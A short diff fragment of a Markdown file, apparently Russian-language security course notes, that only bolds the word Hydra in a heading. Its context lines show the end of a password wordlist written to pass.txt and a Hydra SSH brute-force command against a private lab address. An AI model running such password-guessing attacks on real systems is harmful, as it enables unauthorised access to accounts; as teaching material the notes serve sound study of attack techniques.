@@ -135,7 +135,7 @@ qwerty
 netology" > pass.txt
 ```
 
-Атака Hydra:
+Атака **Hydra**:
 
 ```bash
 hydra -L users.txt -P pass.txt ssh://192.168.10.1
